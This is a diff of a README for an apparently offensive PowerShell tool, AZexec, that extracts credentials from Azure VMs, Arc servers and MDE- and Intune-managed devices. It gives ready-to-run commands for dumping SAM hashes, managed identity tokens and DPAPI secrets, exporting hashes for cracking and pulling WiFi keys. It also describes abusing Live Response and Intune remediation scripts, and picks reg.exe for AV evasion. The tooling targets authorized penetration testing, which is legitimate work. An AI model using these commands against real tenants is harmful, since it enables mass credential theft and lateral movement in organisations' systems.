@@ -1605,7 +1605,16 @@ AZR    vm-web-01            VM     PUT    C:\Windows\Temp\payload.ps1    [+] SUC
 
 ## 🔐 Credential Extraction - NetExec --sam Equivalent
 
-For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs and Arc-enabled devices using multiple extraction techniques.
+For penetration testers familiar with NetExec's credential dumping capabilities (`--sam`), AZexec provides the **Azure cloud equivalent** through the `creds` command. This command extracts credentials from Azure VMs, Arc-enabled devices, MDE-enrolled devices, and Intune-managed devices using multiple extraction techniques.
+
+### Supported Device Types
+
+| Device Type | Execution Method | Sync/Async | Output | Use Case |
+|-------------|------------------|------------|--------|----------|
+| **Azure VMs** | VM Run Command (`vmrun`) | Sync | Direct | Azure native VMs |
+| **Arc Devices** | Arc Run Command (`arc`) | Sync | Direct | On-premises/hybrid servers |
+| **MDE Devices** | Live Response (`mde`) | Async (polling) | Via download link | MDE-enrolled endpoints |
+| **Intune Devices** | Proactive Remediation (`intune`) | Async only | Portal only | Intune-managed devices |
 
 ### Extraction Methods
 
@@ -1624,6 +1633,8 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 | `nxc smb <targets> --sam` | `.\azx.ps1 creds -AllVMs -CredMethod sam` | Extract SAM from all VMs |
 | *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod tokens` | Extract Managed Identity tokens |
 | *N/A* | `.\azx.ps1 creds -VMName "vm-01" -CredMethod dpapi` | Extract DPAPI secrets |
+| *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod mde` | Extract via MDE Live Response |
+| *N/A* | `.\azx.ps1 creds -DeviceName "device" -ExecMethod intune` | Extract via Intune Remediation |
 
 ### Quick Start Examples
 
@@ -1647,10 +1658,32 @@ For penetration testers familiar with NetExec's credential dumping capabilities 
 .\azx.ps1 creds -DeviceName "arc-server-01"
 .\azx.ps1 creds -AllDevices -CredMethod sam
 
+# MDE devices (async with polling)
+.\azx.ps1 creds -DeviceName "mde-device-01" -ExecMethod mde -CredMethod tokens
+.\azx.ps1 creds -DeviceName "mde-endpoint" -ExecMethod mde -CredMethod sam
+
+# Intune devices (async, output in portal only)
+.\azx.ps1 creds -DeviceName "intune-device-01" -ExecMethod intune -CredMethod sam
+
+# Auto-detection (tries Arc, then MDE, then Intune)
+.\azx.ps1 creds -DeviceName "some-device" -CredMethod sam
+
 # Export for cracking
 .\azx.ps1 creds -VMName "vm-01" -HashcatFormat -ExportPath hashes.txt
 .\azx.ps1 creds -AllVMs -ExportPath results.json
 ```
+
+### Execution Method Selection (`-ExecMethod`)
+
+| Value | Description |
+|-------|-------------|
+| **auto** (default) | Auto-detects device type and uses appropriate method |
+| **vmrun** | Force Azure VM Run Command |
+| **arc** | Force Arc Run Command |
+| **mde** | Force MDE Live Response (requires Machine.LiveResponse permission) |
+| **intune** | Force Intune Proactive Remediation (async, portal output only) |
+
+> ⚠️ **Intune Limitation**: Intune Proactive Remediation is async-only. Output is not returned directly and is only visible in the Intune portal. This makes Intune less useful for credential extraction where you need immediate output. Use MDE for better results when both are available.
 
 ### OPSEC Considerations
 
@@ -1694,9 +1727,13 @@ AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found 
 ### Technical Details
 
 #### SAM Extraction Workflow
-1. PowerShell script deployed via VM Run Command (vmrun) or Arc Run Command (arc)
+1. PowerShell script deployed via:
+   - **VM Run Command** (vmrun) - Azure VMs
+   - **Arc Run Command** (arc) - Arc-enabled servers
+   - **MDE Live Response** (mde) - MDE-enrolled devices (async with polling)
+   - **Intune Proactive Remediation** (intune) - Intune-managed devices (async, portal output)
 2. Registry hives exported using `reg.exe save` (better AV evasion)
-3. Hives base64-encoded for transfer via Run Command output
+3. Hives base64-encoded for transfer via command output
 4. Hives decoded locally and parsed:
    - **Primary**: `secretsdump.py` (Impacket) if available
    - **Fallback**: Manual bootkey extraction and SAM decryption
@@ -1714,6 +1751,20 @@ AZR    vm-web-01            443    Windows     Browser: Chrome Login Data found 
 1. **Credential Manager**: Parse `cmdkey /list` output
 2. **WiFi Profiles**: Extract PSKs via `netsh wlan show profile key=clear`
 3. **Browser Credentials**: Identify Login Data paths for offline extraction
+
+#### MDE Live Response Workflow
+1. Acquire MDE API token via `Get-AzAccessToken -ResourceUrl "https://api.security.microsoft.com"`
+2. Query device by name via `/api/machines`
+3. Submit RunScript action via `/api/machines/{id}/runliveresponse`
+4. Poll `/api/machineactions/{actionId}` every 5 seconds
+5. Retrieve output via `GetLiveResponseResultDownloadLink` endpoint
+6. Timeout: 10 minutes maximum
+
+#### Intune Proactive Remediation Workflow
+1. Create temporary `deviceHealthScript` with base64-encoded command
+2. Trigger `initiateOnDemandProactiveRemediation` on target device
+3. Cleanup temporary script
+4. **Note**: Output only visible in Intune portal - no immediate return
 
 ### Required Permissions
 
